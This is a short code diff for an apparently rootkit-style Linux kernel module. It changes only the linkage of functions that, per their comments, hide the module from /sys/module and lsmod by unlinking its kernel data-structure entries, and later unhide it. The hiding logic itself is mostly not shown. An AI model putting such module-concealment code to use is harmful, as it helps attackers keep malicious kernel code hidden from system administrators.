@@ -51,11 +51,11 @@ static struct list_head *module_prev;
 
 
 /* Declaration of functions */
-static int module_masking_init(int);
-static int module_masking_exit(void);
+int module_masking_init(int);
+int module_masking_exit(void);
 
-static void mask_module(void);
-static void unmask_module(void);
+void mask_module(void);
+void unmask_module(void);
 
 /* Implementation of functions below is taken from fs/kernfs/dir.c, lines 224-321 */
 static bool kernfs_unlink_sibling(struct kernfs_node *);
@@ -70,7 +70,7 @@ static int kernfs_link_sibling(struct kernfs_node *);
 
 
 /* Initialization function */
-static int module_masking_init(int debug_mode_on)
+int module_masking_init(int debug_mode_on)
 {
 	show_debug_messages = debug_mode_on;
 
@@ -82,7 +82,7 @@ static int module_masking_init(int debug_mode_on)
 }
 
 
-static int module_masking_exit(void)
+int module_masking_exit(void)
 {
 	unmask_module();
 
@@ -94,7 +94,7 @@ static int module_masking_exit(void)
 
 /* Hide module from /sys/module and from the output of lsmod. Do so by
    removing entries of our module from kernel data structures */
-static void mask_module(void)
+void mask_module(void)
 {
 	struct kernfs_node *kernfs_node_ptr;
 
@@ -128,7 +128,7 @@ static void mask_module(void)
 
 /* Unhide module from /sys/module and from the output of lsmod, so it becomes
    unloadable. Do so by re-adding entries of our module to kernel data structures */
-static void unmask_module(void)
+void unmask_module(void)
 {
 	struct kernfs_node *kernfs_node_ptr;
 
